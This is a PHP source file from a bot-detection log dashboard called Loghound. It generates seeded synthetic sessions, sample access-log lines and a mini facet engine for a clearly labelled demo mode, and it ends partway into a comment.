<?php
/**
 * Loghound — demo data for the panel.
 *
 * WHAT THIS IS: a small synthetic traffic universe plus a miniature JSON-Facet engine
 * that runs over it. It exists so `git clone` + a webserver gives you a working, honest
 * looking dashboard before Solr is provisioned — for screenshots, for offline demos, and
 * so a front-end change can be verified without a backend.
 *
 * WHAT THIS IS NOT: a Solr emulator. The facet engine below understands exactly the
 * handful of query and facet shapes the Panel controllers actually build (see
 * Panel\Query). Anything else is treated as "match everything" rather than silently
 * producing a wrong number.
 *
 * HOW TO TURN IT OFF: demo mode is opt-in. It is active only when `LOGHOUND_DEMO=1` is
 * in the environment or `ui.demo => true` is in config/loghound.php. When it is active
 * every page carries a permanent banner saying the numbers are fabricated — a dashboard
 * that lies about where its data came from is worse than no dashboard.
 *
 * The world is generated from a fixed seed, so the demo is byte-identical on every load
 * and screenshots are reproducible.
 *
 * @package Loghound
 * @license MIT
 */

declare(strict_types=1);

namespace Loghound\Panel;

use Loghound\Score\Attacks;

final class Fixtures
{
    /** Fixed seed: reproducible demo, reproducible screenshots. */
    private const SEED = 20260910;

    /** Number of synthetic sessions spread over the last 30 days. */
    private const SESSIONS = 1400;

    /**
     * The virtual hosts the demo machine serves, and what each one is for.
     *
     * Three, because the Virtual hosts view is a COMPARISON and a comparison needs something
     * to compare. One busy site, one much quieter one carrying most of the scraping, and a
     * small status host that is almost entirely monitors — so the evasive-bot share column,
     * which is the column an operator actually scans, differs by an order of magnitude
     * between rows instead of being the same number three times.
     *
     * `example.com` is first on purpose: it is the vhost the detection fixture reports and
     * the host the sample referers point at, so the demo tells one story across both.
     */
    private const HOSTS = ['example.com', 'shop.example.com', 'status.example.com'];

    /**
     * Per-population odds of each host, in HOSTS order, as cumulative percentages.
     *
     * Keyed by the bot class the branch assigned, with a default for everything else.
     * Humans mostly read the main site; the scrapers and the proxy fleet are after the shop's
     * prices, which is why a shop takes scraping out of proportion to its traffic; monitors
     * only ever poll the status host, which is what a monitor is for.
     */
    private const HOST_ODDS = [
        'proxy_fleet'      => [30, 96, 100],
        'headless'         => [34, 95, 100],
        'scripted'         => [38, 92, 100],
        'monitor'          => [0, 0, 100],
        'ai_crawler'       => [62, 94, 100],
        'declared_crawler' => [60, 92, 100],
        'default'          => [78, 96, 100],
    ];

    /** @var array<int,array<string,mixed>>|null Lazily built session documents. */
    private static ?array $sessions = null;

    /** @var array<int,array<string,mixed>>|null Lazily built hit documents. */
    private static ?array $hits = null;

    /** Reference "now" for the whole demo world, so every view agrees on the clock. */
    private static ?int $now = null;

    /**
     * Answer a JSON Facet request against the synthetic world.
     *
     * @param array<string,mixed> $query Solr request params (q, fq, ...).
     * @param array<string,mixed> $facet json.facet structure.
     * @return array<string,mixed> A facets block shaped exactly like Solr's.
     */
    public static function facet(string $tag, array $query, array $facet): array
    {
        $all = self::plane($tag);
        $docs = self::applyQuery($all, $query);

        return self::compute($docs, $facet, static function (array $tags) use ($all, $query): array {
            return self::applyQueryExcept($all, $query, $tags);
        });
    }

    /**
     * Which synthetic core a query tag reads.
     *
     * ONE DECISION, IN ONE PLACE, because it used to be three copies of the same expression and
     * they disagreed the moment a view arrived whose tags matched none of them. A tag routed to
     * the wrong plane does not error — it answers, with the wrong world — so Panel\Attacks would
     * have faceted `status_i` and `hit_flags_ss` against SESSION documents and drawn a demo page
     * that looked plausible and was nonsense.
     *
     * The Attacks view is deliberately split: five of its cards are hits-plane because a status
     * and a path have to be read off the same document, and its impersonation card is
     * sessions-plane because identity is a session property. The tag names say which.
     */
    /**
     * The synthetic documents of one plane, with everything folded onto them.
     *
     * `sessions()` alone is not enough for a sessions-plane read: the union of a session's hit
     * flags is computed while the HITS are built, so a request that touched only the sessions
     * cache would see every session with no flags at all — and the one sessions-plane card on
     * the Attacks view would be empty beside five full ones, which reads as a broken card. Both
     * builders are memoised and idempotent, so asking for the hits first costs nothing on the
     * second call.
     *
     * @return array<int,array<string,mixed>>
     */
    private static function plane(string $tag): array
    {
        if (self::planeFor($tag) === 'hits') {
            return self::hits();
        }
        self::hits();
        return self::sessions();
    }

    private static function planeFor(string $tag): string
    {
        if (str_starts_with($tag, 'perf.') || str_contains($tag, 'hits')) {
            return 'hits';
        }
        if (str_starts_with($tag, 'atk.')) {
            return $tag === 'atk.impersonation' ? 'sessions' : 'hits';
        }
        return 'sessions';
    }

    /**
     * Re-apply a query with the filters carrying any of these tags left out.
     *
     * The demo half of `domain.excludeTags`, and it is not decoration. Demo mode exists so the
     * panel can be looked at where Solr has never been reachable, and the defect the facet layer
     * was built to fix — a filtered dimension collapsing to the one value you picked — is a
     * FACETING defect. A demo world that ignored the exclusion would reproduce the bug on the
     * page a screenshot is taken from and hide the fix, which is the exact failure mode the
     * Gateway docblock warns about: demo responses must go through the same shaping as real ones
     * so a bug shows up here instead of hiding here.
     *
     * A filter is matched to its tag by the `{!tag=…}` prefix Panel\Facets writes, which is the
     * same string Solr matches on.
     *
     * @param array<int,array<string,mixed>> $all
     * @param array<string,mixed>            $params
     * @param array<int,string>              $tags
     * @return array<int,array<string,mixed>>
     */
    private static function applyQueryExcept(array $all, array $params, array $tags): array
    {
        if ($tags === []) {
            return self::applyQuery($all, $params);
        }

        $kept = [];
        foreach ((array) ($params['fq'] ?? []) as $fq) {
            $fq = (string) $fq;
            $drop = false;
            foreach ($tags as $tag) {
                if (str_starts_with($fq, '{!tag=' . $tag . '}')) {
                    $drop = true;
                    break;
                }
            }
            if (!$drop) {
                $kept[] = $fq;
            }
        }

        return self::applyQuery($all, ['fq' => $kept] + $params);
    }

    /**
     * Answer a value-substring search against the synthetic world.
     *
     * Demo mode has to answer this the same way Solr does or the value browser looks broken on
     * the page a screenshot is taken from. The match is a case-insensitive substring over each
     * distinct value of the field, counted, most common first — which is what
     * `facet.contains` + `facet.contains.ignoreCase` does.
     *
     * The exclusion the real path applies has no analogue here and needs none: the fixtures are
     * a fixed world, so a search over them is already over the whole world.
     *
     * @param array<string,mixed> $params
     * @return array{buckets:array<int,array<string,mixed>>}
     */
    public static function facetContains(
        string $tag,
        string $field,
        string $contains,
        array $params,
        int $limit = 200
    ): array {
        $docs = self::plane($tag);
        $docs = self::applyQuery($docs, $params);

        $needle = mb_strtolower(trim($contains));
        if ($needle === '') {
            return ['buckets' => []];
        }

        $counts = [];
        foreach ($docs as $doc) {
            foreach ((array) ($doc[$field] ?? []) as $value) {
                if (!is_scalar($value)) {
                    continue;
                }
                $value = is_bool($value) ? ($value ? 'true' : 'false') : (string) $value;
                if ($value !== '' && str_contains(mb_strtolower($value), $needle)) {
                    $counts[$value] = ($counts[$value] ?? 0) + 1;
                }
            }
        }
        arsort($counts);

        $buckets = [];
        foreach (array_slice($counts, 0, max(1, $limit), true) as $value => $count) {
            $buckets[] = ['val' => (string) $value, 'count' => (int) $count];
        }
        return ['buckets' => $buckets];
    }

    /**
     * Answer a document query against the synthetic world.
     *
     * @param array<string,mixed> $params
     * @return array{docs:array<int,array<string,mixed>>,numFound:int}
     */
    public static function select(string $tag, array $params): array
    {
        $docs = self::plane($tag);
        $docs = self::applyQuery($docs, $params);

        $sort = (string) ($params['sort'] ?? '');
        if ($sort !== '') {
            [$field, $dir] = array_pad(explode(' ', trim($sort), 2), 2, 'asc');
            usort($docs, static function (array $a, array $b) use ($field, $dir) {
                $av = $a[$field] ?? null;
                $bv = $b[$field] ?? null;
                $cmp = ($av <=> $bv);
                return $dir === 'desc' ? -$cmp : $cmp;
            });
        }

        $numFound = count($docs);
        $start = (int) ($params['start'] ?? 0);
        $rows  = (int) ($params['rows'] ?? 25);
        $page  = array_slice($docs, $start, $rows);

        $fl = (string) ($params['fl'] ?? '');
        if ($fl !== '') {
            $keep = array_flip(array_map('trim', explode(',', $fl)));
            $page = array_map(
                static fn (array $d): array => array_intersect_key($d, $keep),
                $page
            );
        }

        return ['docs' => array_values($page), 'numFound' => $numFound];
    }

    /**
     * A sample log-format detection report, in the same shape `bin/loghound-setup`
     * writes to `var/detect.json`. Used by the Settings view in demo mode.
     *
     * @return array<string,mixed>
     */
    public static function detection(): array
    {
        $lines = [
            '203.0.113.44 - - [10/Sep/2026:09:57:08 +0000] "GET /pricing HTTP/2" 200 18422 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"',
            '203.0.113.44 - - [10/Sep/2026:09:57:09 +0000] "GET /assets/app.css HTTP/2" 200 9110 "https://example.com/pricing" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"',
            '66.249.66.1 - - [10/Sep/2026:09:57:12 +0000] "GET /robots.txt HTTP/1.1" 200 412 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"',
            '195.64.119.253 - - [10/Sep/2026:09:57:14 +0000] "GET /trust-center HTTP/1.1" 200 152381 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"',
            '198.51.100.7 - - [10/Sep/2026:09:57:15 +0000] "POST /api/v1/search HTTP/1.1" 404 219 "-" "python-requests/2.32.3"',
        ];

        $parsed = [
            ['ip_s' => '203.0.113.44', 'ts' => '09/10/2026 09:57:08', 'method_s' => 'GET', 'path_s' => '/pricing', 'status_i' => '200', 'bytes_l' => '18422', 'referer_s' => 'https://www.google.com/', 'ua_s' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ... Chrome/152.0.0.0'],
            ['ip_s' => '203.0.113.44', 'ts' => '09/10/2026 09:57:09', 'method_s' => 'GET', 'path_s' => '/assets/app.css', 'status_i' => '200', 'bytes_l' => '9110', 'referer_s' => 'https://example.com/pricing', 'ua_s' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ... Chrome/152.0.0.0'],
            ['ip_s' => '66.249.66.1', 'ts' => '09/10/2026 09:57:12', 'method_s' => 'GET', 'path_s' => '/robots.txt', 'status_i' => '200', 'bytes_l' => '412', 'referer_s' => '', 'ua_s' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'],
            ['ip_s' => '195.64.119.253', 'ts' => '09/10/2026 09:57:14', 'method_s' => 'GET', 'path_s' => '/trust-center', 'status_i' => '200', 'bytes_l' => '152381', 'referer_s' => 'https://www.google.com/', 'ua_s' => 'Mozilla/5.0 (X11; Linux x86_64) ... Chrome/152.0.0.0'],
            ['ip_s' => '198.51.100.7', 'ts' => '09/10/2026 09:57:15', 'method_s' => 'POST', 'path_s' => '/api/v1/search', 'status_i' => '404', 'bytes_l' => '219', 'referer_s' => '', 'ua_s' => 'python-requests/2.32.3'],
        ];

        $samples = [];
        foreach ($lines as $i => $raw) {
            $samples[] = ['raw' => $raw, 'parsed' => $parsed[$i]];
        }

        return [
            'generated_at' => self::now(),
            'demo'         => true,
            'sources'      => [[
                'path'          => '/var/log/apache2/example_com_access.log',
                'server'        => 'apache',
                'vhost'         => 'example.com',
                'format_name'   => 'combined',
                'format_string' => '%h %l %u %t "%r" %>s %O "%{Referer}i" "%{User-Agent}i"',
                'source'        => 'Parsed from /etc/apache2/sites-enabled/example.com.conf (CustomLog directive)',
                'confidence'    => 99.0,
                'lines_tested'  => 200,
                'lines_parsed'  => 198,
                'confirmed'     => false,
                'mapping'       => [
                    ['token' => '%h', 'field' => 'ip_s', 'example' => '203.0.113.44'],
                    ['token' => '%l', 'field' => '(ignored)', 'example' => '-'],
                    ['token' => '%u', 'field' => '(ignored)', 'example' => '-'],
                    ['token' => '%t', 'field' => 'ts', 'example' => '[10/Sep/2026:09:57:08 +0000]'],
                    ['token' => '%r', 'field' => 'method_s + path_s + query_s + proto_s', 'example' => 'GET /pricing HTTP/2'],
                    ['token' => '%>s', 'field' => 'status_i', 'example' => '200'],
                    ['token' => '%O', 'field' => 'bytes_l', 'example' => '18422'],
                    ['token' => '%{Referer}i', 'field' => 'referer_s', 'example' => 'https://www.google.com/'],
                    ['token' => '%{User-Agent}i', 'field' => 'ua_s', 'example' => 'Mozilla/5.0 ...'],
                ],
                'missing' => [
                    ['field' => 'dur_us_l', 'token' => '%D', 'why' => 'Request duration is not logged — the Performance view will have no latency data.'],
                    ['field' => 'accept_lang_s', 'token' => '%{Accept-Language}i', 'why' => 'Weakens the header fingerprint (fp_hash_s) that exposes proxy fleets.'],
                    ['field' => 'sec_ch_ua_s', 'token' => '%{Sec-CH-UA}i', 'why' => 'Disables the ua_secch_mismatch and platform_mismatch rules entirely.'],
                ],
                'samples' => $samples,
            ]],
        ];
    }

    /** The demo clock. Frozen per request so all views agree. */
    private static function now(): int
    {
        return self::$now ??= time();
    }

    /**
     * Build (once) the synthetic session documents.
     *
     * The distribution is deliberately opinionated rather than uniform, because the point
     * of the demo is to show what the product is FOR: a large, obvious rotating-proxy
     * fleet sharing one header fingerprint across dozens of hosting IPs, a healthy
     * population of declared crawlers that must not be confused with it, and human
     * sessions whose four timing numbers differ from each other the way real ones do.
     *
     * @return array<int,array<string,mixed>>
     */
    private static function sessions(): array
    {
        if (self::$sessions !== null) {
            return self::$sessions;
        }
        mt_srand(self::SEED);
        $now = self::now();

        $paths = [
            '/', '/pricing', '/docs', '/docs/install', '/docs/detection', '/blog',
            '/blog/how-we-detect-headless-chrome', '/trust-center', '/about', '/contact',
            '/download', '/changelog', '/api', '/login', '/signup',
        ];
        $assets = ['/assets/app.css', '/assets/app.js', '/img/logo.svg', '/img/hero.webp', '/fonts/mono.woff2'];

        $isps = [
            [3320, 'Deutsche Telekom AG', 'isp', 'DTAG-DIAL', 'DE', 'Berlin', 52.52, 13.40],
            [7922, 'Comcast Cable', 'isp', 'CCCH-3', 'US', 'Chicago', 41.88, -87.63],
            [12876, 'Scaleway', 'hosting', 'ONLINE-NET', 'FR', 'Paris', 48.86, 2.35],
            [5089, 'Virgin Media', 'isp', 'NTL', 'GB', 'London', 51.51, -0.13],
            [4134, 'Chinanet', 'isp', 'CHINANET-GD', 'CN', 'Guangzhou', 23.13, 113.26],
            [8708, 'RCS & RDS', 'isp', 'RDSNET', 'RO', 'Bucharest', 44.43, 26.10],
            [1136, 'KPN B.V.', 'isp', 'KPN-INTERNET', 'NL', 'Amsterdam', 52.37, 4.90],
            [22394, 'Cellco Partnership', 'mobile', 'VZW-MOBILE', 'US', 'Newark', 40.74, -74.17],
            [15169, 'Google LLC', 'hosting', 'GOOGLE-CLOUD', 'US', 'Mountain View', 37.39, -122.08],
        ];
        $hostings = [
            [14061, 'DigitalOcean LLC', 'hosting', 'DIGITALOCEAN-AMS', 'NL', 'Amsterdam', 52.37, 4.90],
            [16509, 'Amazon.com Inc.', 'hosting', 'AMAZON-EC2-FRA', 'DE', 'Frankfurt', 50.11, 8.68],
            [63949, 'Akamai Connected Cloud', 'hosting', 'LINODE-LON', 'GB', 'London', 51.51, -0.13],
            [9009, 'M247 Europe SRL', 'vpn', 'M247-BUH', 'RO', 'Bucharest', 44.43, 26.10],
            [212238, 'Datacamp Limited', 'vpn', 'CDN77-EU', 'CZ', 'Prague', 50.08, 14.44],
            [45102, 'Alibaba Cloud', 'hosting', 'ALICLOUD-SG', 'SG', 'Singapore', 1.35, 103.82],
        ];

        $browsers = [
            ['Chrome', 152, 'macOS', 'desktop'],
            ['Chrome', 151, 'Windows', 'desktop'],
            ['Safari', 18, 'macOS', 'desktop'],
            ['Safari', 18, 'iOS', 'mobile'],
            ['Firefox', 141, 'Linux', 'desktop'],
            ['Chrome', 152, 'Android', 'mobile'],
            ['Edge', 152, 'Windows', 'desktop'],
        ];

        $crawlers = [
            ['Googlebot', 'search', false, 15169, 'Google LLC', 'hosting', 'GOOGLE-CRAWL', 'US', 'Mountain View', 37.39, -122.08],
            ['bingbot', 'search', false, 8075, 'Microsoft Corporation', 'hosting', 'MSFT-CRAWL', 'US', 'Redmond', 47.67, -122.12],
            ['GPTBot', 'ai', true, 20473, 'OpenAI', 'hosting', 'OPENAI-CRAWL', 'US', 'San Francisco', 37.77, -122.42],
            ['ClaudeBot', 'ai', true, 399358, 'Anthropic', 'hosting', 'ANTHROPIC-CRAWL', 'US', 'San Francisco', 37.77, -122.42],
            ['PerplexityBot', 'ai', true, 396982, 'Perplexity AI', 'hosting', 'PPLX-CRAWL', 'US', 'San Jose', 37.34, -121.89],
            ['Bytespider', 'ai', true, 138699, 'ByteDance Ltd', 'hosting', 'BYTEDANCE-SG', 'SG', 'Singapore', 1.35, 103.82],
            ['CCBot', 'ai', true, 14618, 'Amazon.com Inc.', 'hosting', 'COMMONCRAWL', 'US', 'Ashburn', 39.04, -77.49],
            ['AhrefsBot', 'seo', false, 12876, 'Scaleway', 'hosting', 'AHREFS-NET', 'FR', 'Paris', 48.86, 2.35],
            ['UptimeRobot', 'monitor', false, 14061, 'DigitalOcean LLC', 'hosting', 'UPTIMEROBOT', 'US', 'New York', 40.71, -74.01],
        ];

        $fleetFp = 'a41f9c0e77b3d215e8c6b0d94f2a7c31b58e0d6a';
        $fleetUa = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36';

        $docs = [];
        for ($i = 0; $i < self::SESSIONS; $i++) {
            $frac = (mt_rand(0, 10000) / 10000) ** 2.2;
            $start = $now - (int) round($frac * 30 * 86400) - mt_rand(0, 900);

            $roll = mt_rand(1, 100);

            if ($roll <= 14) {
                $net = $hostings[mt_rand(0, count($hostings) - 1)];
                $ip = self::fleetIp($i);
                $doc = self::baseDoc($start, $ip, $net);
                $doc['fp_hash_s']   = $fleetFp;
                $doc['fp_ips_24h_i'] = mt_rand(31, 47);
                $doc['ua_s']        = $fleetUa;
                $doc['browser_s']   = 'Chrome';
                $doc['browser_ver_i'] = 152;
                $doc['os_s']        = 'Linux';
                $doc['device_s']    = 'desktop';
                $doc['hits_i']      = mt_rand(2, 9);
                $doc['pages_i']     = $doc['hits_i'];
                $doc['assets_i']    = 0;
                $doc['asset_ratio_f'] = 0.0;
                $doc['beacon_b']    = false;
                $doc['js_b']        = false;
                $doc['bot_score_f'] = (float) mt_rand(88, 100);
                $doc['bot_verdict_s'] = 'bot';
                $doc['bot_class_s'] = 'proxy_fleet';
                $doc['bot_reasons_ss'] = ['fp_cluster_proxy_fleet', 'no_js_on_html', 'hosting_asn_browser_ua', 'no_assets'];
                $doc['gap_stddev_ms_l'] = mt_rand(40, 260);
            } elseif ($roll <= 22) {
                $net = $hostings[mt_rand(0, count($hostings) - 1)];
                $doc = self::baseDoc($start, self::poolIp('headless', 6, $i, $net[0]), $net);
                $doc['fp_hash_s'] = '7c1d0b93a4e6f2185d0c93b7ea41f6d208c5b7e9';
                $doc['fp_ips_24h_i'] = mt_rand(2, 6);
                $doc['ua_s'] = $fleetUa;
                $doc['browser_s'] = 'Chrome';
                $doc['browser_ver_i'] = 152;
                $doc['os_s'] = 'Linux';
                $doc['device_s'] = 'desktop';
                $doc['beacon_b'] = true;
                $doc['js_b'] = true;
                $doc['headless_b'] = true;
                $doc['automation_ss'] = ['navigator_webdriver', 'webgl_swiftshader', 'plugins_empty'];
                $doc['webgl_s'] = 'Google SwiftShader';
                $doc['ua_claim_ok_b'] = false;
                $doc['tz_match_b'] = false;
                $doc['client_score_f'] = (float) mt_rand(85, 99);
                $doc['interactions_i'] = 0;
                $doc['max_scroll_pct_i'] = 0;
                $doc['wall_ms_l'] = mt_rand(1200, 4000);
                $doc['visible_ms_l'] = $doc['wall_ms_l'];
                $doc['engaged_ms_l'] = 0;
                $doc['bot_score_f'] = 100.0;
                $doc['bot_verdict_s'] = 'bot';
                $doc['bot_class_s'] = 'headless';
                $doc['bot_reasons_ss'] = ['automation_marker', 'headless_renderer', 'ua_claim_failed', 'no_interaction', 'tz_mismatch'];
            } elseif ($roll <= 28) {
                $c = $crawlers[mt_rand(0, count($crawlers) - 1)];
                $net = [$c[3], $c[4], $c[5], $c[6], $c[7], $c[8], $c[9], $c[10]];
                $doc = self::baseDoc($start, self::ip($net[0]), $net);
                $doc['ua_s'] = 'Mozilla/5.0 (compatible; ' . $c[0] . '/2.1; +http://example.com/bot)';
                $doc['device_s'] = 'bot';
                $doc['browser_s'] = 'other';
                $doc['ua_bot_b'] = true;
                $doc['ua_bot_name_s'] = $c[0];
                $doc['ua_bot_cat_s'] = $c[1];
                $doc['ai_crawler_b'] = $c[2];
                /* ONE IMPERSONATOR IN THE DEMO WORLD, because it is the case the whole view was
                   built from: a session wearing a named crawler's User-Agent, answering from a
                   rented cloud machine. Roughly one declared crawler in nine, deterministic
                   against the seed, and only for a search or AI name — those are the operators
                   who run their own infrastructure, which is what makes the contradiction
                   meaningful. Its reverse DNS is a tenant name and its claim is NOT verified, so
                   the impersonation card has something true to show and the roll-call underneath
                   it has a row with sessions and no verified ones. */
                $faking = mt_rand(1, 9) === 1 && ($c[1] === 'search' || $c[1] === 'ai');
                $doc['rdns_ok_b'] = !$faking;
                $doc['rdns_s'] = $faking
                    ? mt_rand(2, 250) . '.' . mt_rand(2, 250) . '.89.34.bc.googleusercontent.com'
                    : strtolower($c[0]) . '-' . mt_rand(1, 250) . '.crawl.example.net';
                if ($faking) {
                    $doc['as_type_s'] = 'hosting';
                    $doc['as_org_s'] = 'Google Cloud Platform';
                }
                $doc['fp_hash_s'] = 'c0' . substr(sha1($c[0]), 2);
                $doc['fp_ips_24h_i'] = mt_rand(4, 40);
                $doc['hits_i'] = mt_rand(1, 40);
                $doc['pages_i'] = $doc['hits_i'];
                $doc['assets_i'] = 0;
                $doc['beacon_b'] = false;
                $doc['js_b'] = false;
                $doc['bot_score_f'] = 100.0;
                $doc['bot_verdict_s'] = 'bot';
                $doc['bot_class_s'] = $faking
                    ? 'spoofed_ua'
                    : ($c[2] ? 'ai_crawler' : ($c[1] === 'monitor' ? 'monitor' : 'declared_crawler'));
                $doc['bot_reasons_ss'] = $faking
                    ? ['ua_declared_bot', 'rdns_claim_failed']
                    : ['ua_declared_bot'];
            } elseif ($roll <= 34) {
                $net = $hostings[mt_rand(0, count($hostings) - 1)];
                $doc = self::baseDoc($start, self::poolIp('scripted', 12, $i, $net[0]), $net);
                $doc['ua_s'] = mt_rand(0, 1) ? 'python-requests/2.32.3' : 'curl/8.7.1';
                $doc['browser_s'] = 'other';
                $doc['device_s'] = 'unknown';
                $doc['fp_hash_s'] = '5d8a' . substr(sha1($doc['ua_s']), 4);
                $doc['fp_ips_24h_i'] = mt_rand(1, 4);
                $doc['hits_i'] = mt_rand(1, 25);
                $doc['pages_i'] = $doc['hits_i'];
                $doc['assets_i'] = 0;
                $doc['beacon_b'] = false;
                $doc['status_4xx_i'] = mt_rand(0, 12);
                $doc['bot_score_f'] = (float) mt_rand(70, 95);
                $doc['bot_verdict_s'] = $doc['bot_score_f'] >= 80 ? 'bot' : 'likely_bot';
                $doc['bot_class_s'] = 'scripted';
                $doc['bot_reasons_ss'] = ['no_js_on_html', 'no_assets', 'hosting_asn_browser_ua', 'periodic_timing'];
                $doc['gap_stddev_ms_l'] = mt_rand(5, 90);
            } elseif ($roll <= 40) {
                $net = $isps[mt_rand(0, count($isps) - 1)];
                $doc = self::baseDoc($start, self::ip($net[0]), $net);
                $b = $browsers[mt_rand(0, count($browsers) - 1)];
                $doc = self::withBrowser($doc, $b);
                $doc['hits_i'] = mt_rand(1, 4);
                $doc['pages_i'] = 1;
                $doc['assets_i'] = max(0, $doc['hits_i'] - 1);
                $doc['beacon_b'] = false;
                $doc['bot_score_f'] = (float) mt_rand(40, 59);
                $doc['bot_verdict_s'] = 'unknown';
                $doc['bot_class_s'] = 'none';
                $doc['bot_reasons_ss'] = ['no_js_on_html', 'single_page_10s'];
            } else {
                $net = $isps[mt_rand(0, count($isps) - 1)];
                $doc = self::baseDoc($start, self::ip($net[0]), $net);
                $b = $browsers[mt_rand(0, count($browsers) - 1)];
                $doc = self::withBrowser($doc, $b);

                $pages = mt_rand(1, 7);
                $doc['pages_i'] = $pages;
                $doc['assets_i'] = $pages * mt_rand(3, 9);
                $doc['hits_i'] = $pages + $doc['assets_i'];
                $doc['asset_ratio_f'] = round($doc['assets_i'] / max(1, $doc['hits_i']), 3);
                $doc['got_304_b'] = mt_rand(0, 10) > 2;
                $doc['beacon_b'] = mt_rand(1, 100) <= 88;
                $doc['js_b'] = $doc['beacon_b'];

                if ($doc['beacon_b']) {
                    $wall = mt_rand(20000, 900000);
                    $visible = (int) round($wall * (mt_rand(35, 92) / 100));
                    $engaged = (int) round($visible * (mt_rand(20, 80) / 100));
                    $doc['wall_ms_l'] = $wall;
                    $doc['visible_ms_l'] = $visible;
                    $doc['engaged_ms_l'] = $engaged;
                    $doc['interactions_i'] = mt_rand(3, 180);
                    $doc['max_scroll_pct_i'] = mt_rand(15, 100);
                    $doc['pageviews_i'] = $pages;
                    $doc['ua_claim_ok_b'] = true;
                    $doc['tz_match_b'] = mt_rand(0, 20) > 0;
                    $doc['client_score_f'] = (float) mt_rand(0, 12);
                }
                $doc['bot_score_f'] = (float) mt_rand(0, 30);
                $doc['bot_verdict_s'] = $doc['bot_score_f'] < 20 ? 'human' : 'likely_human';
                $doc['bot_class_s'] = 'none';
                $doc['bot_reasons_ss'] = $doc['bot_score_f'] < 20 ? [] : ['single_page_10s'];
                $doc['fp_hash_s'] = 'f' . substr(sha1($doc['ua_s'] . '|' . $doc['ip_net_s']), 1);
                $doc['fp_ips_24h_i'] = mt_rand(1, 3);
            }

            $doc['host_s'] = self::host($i, (string) ($doc['bot_class_s'] ?? 'none'));

            $span = (int) round(($doc['hits_i'] - 1) * mt_rand(400, 9000));
            $doc['log_span_ms_l'] = max(0, $span);
            $doc['ts_end'] = self::iso($start + (int) round($span / 1000));
            $doc['gap_p50_ms_l'] = $doc['hits_i'] > 1 ? (int) round($span / max(1, $doc['hits_i'] - 1)) : 0;

            $entry = $paths[mt_rand(0, count($paths) - 1)];
            $doc['entry_path_s'] = $entry;
            $doc['exit_path_s'] = $paths[mt_rand(0, count($paths) - 1)];
            $sessionPaths = [$entry];
            for ($p = 1; $p < min(6, (int) $doc['pages_i']); $p++) {
                $sessionPaths[] = $paths[mt_rand(0, count($paths) - 1)];
            }
            if (($doc['assets_i'] ?? 0) > 0) {
                $sessionPaths[] = $assets[mt_rand(0, count($assets) - 1)];
            }
            $doc['paths_ss'] = array_values(array_unique($sessionPaths));
            $doc['uniq_paths_i'] = count($doc['paths_ss']);
            $doc['bytes_l'] = $doc['hits_i'] * mt_rand(2000, 90000);
            $doc['status_2xx_i'] = max(0, $doc['hits_i'] - ($doc['status_4xx_i'] ?? 0));

            $docs[] = $doc;
        }

        self::$sessions = $docs;
        return $docs;
    }

    /**
     * Build the shared skeleton of a session document.
     *
     * Fields that we have no evidence for are simply ABSENT, never zero-filled — SPEC §1
     * is explicit that a fabricated zero is worse than a missing field, and the demo has
     * to obey the same rule or it teaches the wrong thing.
     *
     * `doc_type_s` is not decoration. The sessions core holds session documents and daily
     * rollups, so every panel query against it carries `doc_type_s:session` — and a demo
     * world whose documents did not declare their type matched none of those filters, which
     * emptied the whole dashboard the moment the filter was introduced. The demo has to
     * satisfy the same contract the real schema states.
     *
     * @param array{0:int,1:string,2:string,3:string,4:string,5:string,6:float,7:float} $net
     * @return array<string,mixed>
     */
    private static function baseDoc(int $start, string $ip, array $net): array
    {
        $tzByCountry = [
            'DE' => 'Europe/Berlin', 'US' => 'America/Chicago', 'FR' => 'Europe/Paris',
            'GB' => 'Europe/London', 'CN' => 'Asia/Shanghai', 'RO' => 'Europe/Bucharest',
            'NL' => 'Europe/Amsterdam', 'SG' => 'Asia/Singapore', 'CZ' => 'Europe/Prague',
        ];
        $referers = [
            ['https://www.google.com/', 'www.google.com', 'search'],
            ['https://duckduckgo.com/', 'duckduckgo.com', 'search'],
            ['https://news.ycombinator.com/', 'news.ycombinator.com', 'social'],
            ['https://chatgpt.com/', 'chatgpt.com', 'ai'],
            ['', '', 'direct'],
            ['', '', 'direct'],
        ];
        $ref = $referers[mt_rand(0, count($referers) - 1)];

        /*
         * THE ID MUST NOT DEPEND ON THE CLOCK.
         *
         * It was sha1 of the address, the start instant and a draw from the seeded generator.
         * The draw is reproducible; `$start` is derived from time() and is not, so every
         * request minted a different id for the same synthetic visit — and the session detail
         * dialog, which looks a session up by the id the list handed the browser, could never
         * find one. Every other dialog in the panel keys on a stable value (a fingerprint
         * hash, an ASN, a hostname) and worked, which is why only this one looked broken.
         *
         * The file's own contract is "generated from a fixed seed, byte-identical on every
         * load". Two draws from the seeded generator honour it; the timestamps stay relative
         * to now so the range picker still selects something.
         */
        $doc = [
            'id'         => sha1('lh' . $ip . mt_rand() . mt_rand()),
            'doc_type_s' => 'session',
            'ts_start'   => self::iso($start),
            'hits_i'     => 1,
            'pages_i'    => 1,
            'assets_i'   => 0,
            'ip_s'       => $ip,
            'ip_net_s'   => preg_replace('/\.\d+$/', '.0/24', $ip),
            'asn_i'      => $net[0],
            'as_org_s'   => $net[1],
            'as_type_s'  => $net[2],
            'netname_s'  => $net[3],
            'country_s'  => $net[4],
            'city_s'     => $net[5],
            'region_s'   => $net[5],
            'tz_s'       => $tzByCountry[$net[4]] ?? 'UTC',
            'rdns_ok_b'  => false,
            'beacon_b'   => false,
            'ua_bot_b'   => false,
            'ai_crawler_b' => false,
            'rule_version_i' => 1,
            'referer_type_s' => $ref[2],
        ];
        if ($ref[0] !== '') {
            $doc['referer_s'] = $ref[0];
            $doc['referer_host_s'] = $ref[1];
        }
        $doc['session_id_s'] = $doc['id'];
        $doc['visitor_s'] = substr(sha1($doc['ip_net_s'] . '|' . $net[4]), 0, 20);
        return $doc;
    }

    /**
